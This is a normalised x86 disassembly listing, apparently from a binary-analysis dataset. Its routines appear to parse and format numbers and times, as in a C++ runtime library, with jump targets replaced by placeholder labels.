mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10043259
mov ecx [ ebp - 0x6c ]
call sub_10042ae0
mov esi [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] esi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10042d3e
cmp ax si
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005cd0
push [ ebp - 0x74 ]
mov esi [ ebp - 0x6c ]
push esi
mov [ ebp - 0x4 ] 0xc
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x108 ]
push eax
mov ecx ebx
call sub_1004317c
or [ ebp - 0x70 ] 0x10
push esi
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_1004256a
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10042d3e
cmp [ esi ] ax
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10042e00
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_100020e2
jmp r-xdata
sub esi [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x10
mov esi [ ebp - 0x60 ]
jae r-xdata
mov ecx esi
call sub_10042d3e
cmp [ ebp - 0x80 ] ax
ja r-xdata
test [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x108 ]
call sub_10042e00
mov bl 0x1
jmp r-xdata
push [ ebp - 0x80 ]
mov ecx edi
push 0x1
call sub_10043259
dec esi
jne r-xdata
jmp r-xdata
mov ecx edi
call sub_10042ae0
push [ ebp - 0x74 ]
push edi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x60 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10042d3e
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x70 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x140 ]
call sub_10042e00
test [ ebp - 0x70 ] 0x10
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax [ ebp - 0x9c ]
jge r-xdata
mov eax [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
test edi edi
jbe r-xdata
test edi edi
je r-xdata
mov ecx esi
call sub_10042d3e
cmp ax [ ebp - 0xb8 ]
jne r-xdata
mov ecx esi
call sub_10042d3e
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10043259
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10042ae0
mov ecx [ ebp - 0xa0 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_1004317c
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_1004334b
push 0x0
push 0x1
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
call sub_10042e00
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10042d3e
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov [ ebp - 0x65 ] 0x1
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_100020e2
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
inc edi
mov ecx esi
call sub_10042ae0
push [ ebp - 0x74 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
mov ecx edi
call sub_10042d3e
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
mov ecx edi
call sub_10042d3e
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10043259
inc [ ebp - 0x84 ]
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_10047b39
push 0x11c
mov eax sub_1004f2fc
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x74 ] ecx
xor edi edi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10045159
pop ecx
lea ecx [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100451f6
pop ecx
lea ecx [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x6c ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10007dbd
add esi 0x8
push esi
push edi
push 0x30
call sub_1004158d
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
mov [ ebp - 0x78 ] esi
call sub_10043163
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax edi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x6c ]
sub ecx eax
push esi
inc ecx
push ecx
push edi
lea ecx [ ebp + 0x24 ]
call sub_100434b8
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_100430dd
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_10043240
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1004317c
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
xor esi esi
mov [ ebp - 0x65 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003f21b
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_1004334b
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_10042e00
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x48 ]
call sub_1004334b
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
call sub_10042e00
lea ecx [ ebp - 0x64 ]
call sub_100430dd
mov eax [ ebp - 0x74 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
movzx eax ax
mov [ ebp - 0x70 ] eax
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x6c ]
jmp r-xdata
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x65 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + 0x18 ]
cmp eax edi
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
xor esi esi
cmp eax esi
jbe r-xdata
mov edx [ ebp - 0x6c ]
cmp [ ebp + 0x38 ] edx
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x7c ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
mov eax edx
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_100434b8
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0x94 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100428df
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100428df
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov edi [ ecx + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edi edi
cmp edi edx
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
mov edi eax
inc [ ebp - 0x7c ]
cmp [ ebp - 0x7c ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100428df
add esp 0x14
xor esi esi
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10042caf
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x7c ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100428a3
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x74 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x84 ]
call sub_100428df
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_10042e00
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10042e00
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_10042e00
mov eax [ ebp - 0x84 ]
call sub_1002b392
retn 0x38
push edi
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10042caf
mov ecx eax
call sub_10042e4d
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100428a3
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10042caf
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf0 ]
jmp r-xdata
mov eax [ ebp - 0x6c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10042caf
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd0 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10042caf
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x6c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x118 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100428a3
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_100423a5
push [ ebp - 0x6c ]
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10042dd6
mov ecx eax
call sub_10042e7c
push [ ebp - 0x6c ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe0 ]
jmp r-xdata
push [ ebp - 0x78 ]
lea ecx [ ebp + 0xc ]
call sub_100423a5
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_100423a5
mov eax [ ebp - 0x6c ]
sub eax [ ebp + 0x38 ]
push eax
push [ ebp - 0x78 ]
lea eax [ ebp - 0xd8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100428df
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10042caf
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf8 ]
jmp r-xdata
sub_10048087
push 0x10
mov eax sub_1004f324
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10007876
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100453cd
push edi
push ebx
push eax
call sub_100415bb
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1004540c
push edi
push ebx
push eax
call sub_100415bb
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1004de44
mov [ esi + 0x10 ] eax
call sub_1002b37e
retn 0x4
sub_1004810a
push 0x54
mov eax sub_1004f34f
call sub_1002b30f
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x60 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x5c ] ebx
call sub_10045594
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_10007340
add esp 0xc
lea ecx [ ebp - 0x48 ]
movzx ebx ax
call sub_100082a7
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006c60
xor esi esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_100230f0
cmp [ eax ] bx
jb r-xdata
or [ edi ] 0x2
jmp r-xdata
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_100014aa
push esi
lea ecx [ ebp - 0x2c ]
call sub_100230f0
movzx eax [ eax ]
movzx ecx bx
add ecx 0x9
cmp ecx eax
jge r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_1000264e
mov eax ebx
call sub_1002b392
retn 0x24
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x49 ] 0x30
sub [ ebp - 0x49 ] bl
cmp esi [ ebp - 0x18 ]
jae r-xdata
lea eax [ ebp - 0x50 ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x50 ] ebx
call sub_10022dec
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x44 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_100230f0
mov al [ eax ]
add al [ ebp - 0x49 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x58 ] al
push [ ebp - 0x58 ]
push 0x1
call sub_100014aa
inc esi
cmp esi [ ebp - 0x18 ]
jb r-xdata
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x50 ] ebx
jne r-xdata
mov eax [ ebp - 0x60 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov ebx [ ebp - 0x5c ]
sub_1004825c
push 0x20
mov eax sub_1004f37c
call sub_1002b30f
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10045594
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1000253c
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1000264e
mov eax edi
call sub_1002b392
retn 0x24
sub_100482db
push 0x54
mov eax sub_1004f3a9
call sub_1002b30f
fldz
xor ebx ebx
fcomp [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ebx
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_10001bdf
fld [ ebp + 0x20 ]
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_10027b13
add esp 0x14
xor esi esi
cmp eax ebx
mov [ ebp - 0x5c ] eax
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_10007340
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10005db8
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_100025cf
push [ ebp - 0x60 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10045e12
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1000264e
mov eax [ ebp + 0x8 ]
call sub_1002b392
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_10007340
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10005db8
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_100483fb
push 0x2c
mov eax sub_1004f3d6
call sub_1002b30f
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x34 ] edi
add edi 0x8
push edi
push 0x0
push 0x30
call sub_10007340
add esp 0xc
cmp [ esi + 0x18 ] 0x8
movzx ebx ax
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
movzx eax [ esi ]
cmp bx ax
ja r-xdata
inc esi
mov [ ebp - 0x30 ] 0x1
inc esi
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x30 ] 0x0
call sub_10007340
add esp 0xc
cmp [ esi ] ax
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10004a31
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
movzx ecx bx
movzx eax ax
add ecx 0x9
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x38 ] esp
push eax
call sub_100025cf
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10045e12
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov eax [ ebp + 0x8 ]
call sub_1002b392
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005db8
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_100484d1
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10046360
mov eax esi
call sub_1002b37e
retn 0x8
sub_10048504
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x20
sub_10048545
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004852d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10048566
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ebx
call sub_10007340
add esp 0xc
push [ ebp - 0x28 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea edi [ ebp - 0x24 ]
call sub_100068a0
test al al
jne r-xdata
push [ ebp - 0x28 ]
xor bl bl
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push 0x0
push 0x2b
call sub_10007340
add esp 0xc
mov ecx esi
mov bx ax
call sub_10005f4d
cmp ax bx
jne r-xdata
push [ ebp - 0x28 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10005f4d
cmp ax [ ebp - 0x2c ]
jne r-xdata
push [ ebp - 0x34 ]
push 0x0
push 0x2d
call sub_10007340
add esp 0xc
mov ecx esi
mov bx ax
call sub_10005f4d
cmp ax bx
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ecx esi
call sub_10005f4d
cmp [ ebp - 0x2c ] ax
ja r-xdata
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_10006020
push [ ebp - 0x28 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] 0x2d
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_10006020
mov ecx esi
call sub_10005f4d
movzx ecx [ ebp - 0x2c ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x30 ] ebx
call sub_100229f4
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_100068a0
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_10005f4d
mov cl 0x30
sub cl [ ebp - 0x2c ]
add al cl
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x3c ] eax
je r-xdata
inc ebx
mov ecx esi
mov bl 0x1
call sub_10006020
inc edi
or ebx 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
sub_10048700
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_10007340
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x4 ]
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10006020
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10006020
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_100487c4
mov edi edi
